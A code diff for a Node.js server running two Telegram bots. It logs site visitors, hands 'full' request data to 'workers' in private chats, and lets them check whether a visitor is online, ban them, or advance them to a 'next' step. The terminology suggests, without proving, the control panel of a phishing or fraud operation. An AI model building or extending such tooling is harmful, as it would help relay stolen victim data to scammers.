@@ -11,8 +11,16 @@ app.use((req, res, next) => {
 });
 
 // ===== БОТЫ =====
+
+// ✅ ТОЛЬКО ОДИН polling
 const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, { polling: true });
-const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });
+
+// ❌ БЕЗ polling (иначе 409)
+const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);
+
+// убираем вебхуки (на всякий)
+workerBot.deleteWebHook();
+enterBot.deleteWebHook();
 
 // ===== ENV =====
 const adminId = Number(process.env.ADMIN_CHAT_ID);
@@ -33,13 +41,14 @@ function isOnline(id) {
   return Date.now() - onlineUsers[id] < 20000;
 }
 
-// ===== ВХОД =====
+// ===== ВХОД НА САЙТ =====
 app.post("/enter", (req, res) => {
   const id = req.body.clientId;
   if (!id) return res.json({ ok: false });
 
   onlineUsers[id] = Date.now();
 
+  // второй бот просто отправляет
   enterBot.sendMessage(adminId, `👀 Переход\n🆔 ${id}`).catch(()=>{});
 
   res.json({ ok: true });
@@ -115,7 +124,7 @@ workerBot.on("callback_query", async (q) => {
 
     takenRequests[id] = q.from.id;
 
-    // 🔥 ОТПРАВКА В ЛИЧКУ С КНОПКАМИ
+    // 👉 фулл в личку + кнопки
     workerBot.sendMessage(q.from.id, fullRequests[id], {
       reply_markup: {
         inline_keyboard: [
@@ -149,9 +158,7 @@ workerBot.on("callback_query", async (q) => {
       });
     } catch {}
 
-    workerBot.answerCallbackQuery(q.id, {
-      text: "✅ Заявка у тебя"
-    });
+    workerBot.answerCallbackQuery(q.id);
   }
 
   // ===== ОСВОБОДИТЬ =====
@@ -185,7 +192,6 @@ workerBot.on("callback_query", async (q) => {
   // ===== КНОПКИ В ЛИЧКЕ =====
   if (data.startsWith("check")) {
     const online = isOnline(id);
-
     workerBot.answerCallbackQuery(q.id, {
       text: online ? "🟢 Онлайн" : "🔴 Оффлайн"
     });
@@ -193,23 +199,17 @@ workerBot.on("callback_query", async (q) => {
 
   if (data.startsWith("ban")) {
     bannedUsers[id] = true;
-    workerBot.answerCallbackQuery(q.id, {
-      text: "🚫 Забанен"
-    });
+    workerBot.answerCallbackQuery(q.id, { text: "🚫 Забанен" });
   }
 
   if (data.startsWith("unban")) {
     delete bannedUsers[id];
-    workerBot.answerCallbackQuery(q.id, {
-      text: "✅ Разбанен"
-    });
+    workerBot.answerCallbackQuery(q.id, { text: "✅ Разбанен" });
   }
 
   if (data.startsWith("allow")) {
     userStatus[id] = "next";
-    workerBot.answerCallbackQuery(q.id, {
-      text: "➡️ Разрешено"
-    });
+    workerBot.answerCallbackQuery(q.id, { text: "➡️ Разрешено" });
   }
 });
 
